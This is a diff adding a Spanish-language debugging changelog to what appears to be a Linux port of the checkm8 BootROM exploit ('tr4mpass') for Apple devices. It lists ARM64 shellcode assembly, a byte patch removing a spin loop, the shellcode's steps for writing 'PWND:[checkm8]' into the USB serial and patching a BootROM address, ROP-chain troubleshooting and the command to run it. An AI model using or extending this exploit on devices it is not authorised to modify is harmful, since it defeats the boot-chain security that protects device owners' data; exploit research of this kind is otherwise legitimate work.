@@ -1405,3 +1405,67 @@ sudo ./tr4mpass
 ```
 
 Pero dado que `actual=2016 completed=1` ya funciona SIN bus reset, la siguiente prioridad es depurar el ROP chain en sí mismo — verificar los page table entries y el nop_gadget.
+
+---
+
+## v1.0.41 — Fix del spin loop en el shellcode ARM64 (2026-06-01 ~01:26)
+
+### Root cause identificado: `cbnz w1, #-0x8` loop infinito
+
+El análisis cruzado de los nuevos logs reveló el bug real:
+
+**El shellcode ARM64 (en `shellcode.h` offset 64) contenía:**
+```asm
+ldr  x0, =gUSBSerialNumber    ; x0 = 0x180083CF8
+add  x0, x0, #1               ; x0 = 0x180083CF9
+ldrb w1, [x0]                 ; w1 = byte at 0x180083CF9
+cbnz w1, #-0x8               ; ← SPIN LOOP: loop while w1 != 0
+```
+
+**Por qué nunca salía (en Linux):**
+- `gUSBSerialNumber+1 = 0x180083CF9` contiene el segundo byte del serial string actual: `'P'` (de `"CPID:8010..."`) = 0x50 ≠ 0
+- El loop gira INFINITAMENTE porque ese byte nunca se vuelve cero
+- En macOS/IOKit, una re-inicialización USB del host después de entregar el payload limpia momentáneamente ese byte → el loop sale
+- En Linux, nunca ocurre esa limpieza → el loop nunca sale
+
+**Evidencia de los logs que confirmó esta hipótesis:**
+- `actual=2016 completed=1` ← payload llega completo ✅
+- STATUS phase toutea a los 1000ms ← BootROM ejecutando (el spin loop) ✅
+- USB addr siempre la misma (54, 57, etc.) ← BootROM no crashea, está girando ✅
+- Serial siempre limpio ← shellcode nunca llega a `stp x2, x3, [x0]` (write PWND) ✅
+
+**Fix aplicado:**
+```diff
+- 0xC1, 0xFF, 0xFF, 0x35,  /* cbnz w1, #-0x8  ← spin loop infinito */
++ 0x1F, 0x20, 0x03, 0xD5,  /* nop              ← sin loop, proceed  */
+```
+
+Con `nop`, el shellcode procede inmediatamente a:
+1. `adr x1, PWND_STR` → x1 apunta a `" PWND:[checkm8]"` en el config struct
+2. `ldp x2, x3, [x1]` → carga 16 bytes del string PWND
+3. `stp x2, x3, [x0]` → escribe en `gUSBSerialNumber+1` (SRAM writable via entry 0xC0)
+4. `blr usb_create_string_descriptor(gUSBSerialNumber)` → actualiza el descriptor USB
+5. `strb w0, [usb_serial_number_string_descriptor]` → actualiza el índice del descriptor
+6. `str w0, [patch_addr]` → parchea 0x1020074AC con `0xD2800000`
+7. `ret` → el BootROM continúa normalmente
+
+### Qué esperar de v1.0.41
+
+Con `EP0_RECOVERY=none` (default):
+- Overwrite STALL ✅
+- Payload 2016 bytes → `actual=2016 completed=1` ✅
+- Shellcode escribe PWND en gUSBSerialNumber+1
+- El STATUS phase sigue timeouteando (el shellcode demora en ejecutar antes de que el BootROM pueda responder)
+- Bus reset de verificación → serial debería mostrar `PWND:[checkm8]`
+
+### Comando de prueba (sin variables de entorno extra necesario):
+```bash
+# En Linux con device en DFU:
+sudo ./tr4mpass
+```
+El default es `EP0_RECOVERY=none` + `FINALIZE=gaster`. Si el shellcode parchea el serial correctamente, el bus reset de verificación debería ver `PWND:[checkm8]` en el serial string.
+
+**Si el serial aparece corrupto** (no exactamente PWND pero tampoco el serial limpio) → el shellcode ejecutó pero algún paso falló (usb_create_string_descriptor, etc.). En ese caso probar con `CHECKM8_POST_PAYLOAD_DELAY_MS=200` para darle más tiempo al shellcode antes del bus reset.
+
+**Si el serial sigue limpio** → el problema está antes del shellcode: en el ROP chain (func_gadget, write_ttbr0, o tlbi).
+
